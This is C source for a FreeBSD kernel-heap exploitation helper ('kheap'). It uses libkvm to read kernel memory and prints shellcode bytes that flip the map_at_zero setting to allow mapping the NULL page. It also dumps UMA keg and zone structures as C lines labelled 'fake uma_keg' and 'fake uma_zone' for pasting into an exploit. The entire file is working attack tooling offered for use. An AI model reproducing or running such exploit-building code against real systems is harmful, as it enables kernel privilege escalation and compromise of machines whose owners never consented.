/* kheap -- use libkvm to dump useful stuffs for FreeBSD kernel heap exploitation.
 *
 * TODO: use kernel.symbols to add comments and replace the uz_dtors by 0xdeadbeef.
 *
 * (c) 2o12 - clem1
 */
#include <stdio.h>
#include <fcntl.h>
#include <kvm.h>
#include <nlist.h>
#include <stdlib.h>
#include <limits.h>

#include <sys/types.h>
#include <sys/syscall.h>
#include <sys/queue.h>

#include <vm/vm.h>
#include <vm/vm_object.h>
#include <vm/vm_page.h>
#include <vm/vm_param.h>
#include <vm/vm_map.h>
#include <vm/vm_kern.h>
#include <vm/vm_extern.h>
#include <vm/uma.h>
#include <vm/uma_int.h>
#include <vm/uma_dbg.h>

/* dump data into stdout so this can be use in C exploit */
void voiddumper(u_long *data, size_t size)
{
    u_long *end = data + (size / sizeof(u_long));
    while (data < end)
        printf("*lptr++ = 0x%x;\t/* */\n", *data++);
}

int main(int ac, char **av)
{
    kvm_t           *kd;
    unsigned long   kegaddr;
    struct nlist    n[] = { { NULL }, { NULL }, { NULL }, };
    int             ksize;
    char            zeroaddr[sizeof(unsigned long)];

    if (ac != 2)
        printf("usage: %s <item-size>\n", av[0]), exit(EXIT_FAILURE);

    /* keg size */
    ksize = atoi(av[1]);

    kd = kvm_openfiles(NULL, NULL, NULL, O_RDWR, NULL);
    if(kd == NULL)
        exit(EXIT_FAILURE);

    /* Find map_at_zero addr */
    n[0].n_name = "map_at_zero";
    /* Find the kegs */
    n[1].n_name = "uma_kegs";
    if(kvm_nlist(kd, n) < 0)
        exit(EXIT_FAILURE);
    printf("/* map_at_zero addr = 0x%x = 1 */\n", n[0].n_value);
    *(long *)&zeroaddr[0] = n[0].n_value;
    printf("\"\\xb8\\x%hhx\\x%hhx\\x%hhx\\x%hhx\" /* mov $0x%x,%%eax */\n", zeroaddr[0], zeroaddr[1], zeroaddr[2], zeroaddr[3], n[0].n_value);
    printf("\"\\xc7\\x00\\x01\\x00\\x00\\x00\"    /* mov $1,(%%eax) */\n\n");

    /* vroom! find the keg for the supplied size */
    kegaddr = n[1].n_value;
    while (kegaddr != 0)
    {
        struct uma_keg  keg;
        struct uma_zone zone;
        char            kegname[16];

        /* Grab da keg */
        if(kvm_read(kd, kegaddr, &keg, sizeof(struct uma_keg)) < 0)
            fprintf(stderr, "%s\n", kvm_geterr(kd)), exit(EXIT_FAILURE);

        /* Grab da keg name */
        if(kvm_read(kd, (unsigned long)keg.uk_name, kegname, sizeof(kegname)) < 0)
            fprintf(stderr, "%s\n", kvm_geterr(kd)), exit(EXIT_FAILURE);

        /* Good one? */
        if (keg.uk_size == ksize)
        {
            /* Print for (non)-offpage */
            printf("%s\n", (keg.uk_slabzone == NULL) ? "/* non-offpage kegs */" : "/* offpage */");

            /* Dump da keg struct */
            printf("/* fake uma_keg */\n");
            voiddumper(&keg, sizeof(struct uma_keg));

            /* Grab da uma zone struct */
            if(kvm_read(kd, keg.uk_zones.lh_first, &zone, sizeof(struct uma_zone)) < 0)
                fprintf(stderr, "%s\n", kvm_geterr(kd)), exit(EXIT_FAILURE);

            /* Dump it */
            printf("/* fake uma_zone (%x) */\n", keg.uk_zones.lh_first);
            voiddumper(&zone, sizeof(struct uma_zone));
            /* kthxbye. */
            break;
        }

        /* Next slide please. */
        kegaddr = (unsigned long)keg.uk_link.le_next;
    }

    kvm_close(kd);
    exit(EXIT_SUCCESS);
}
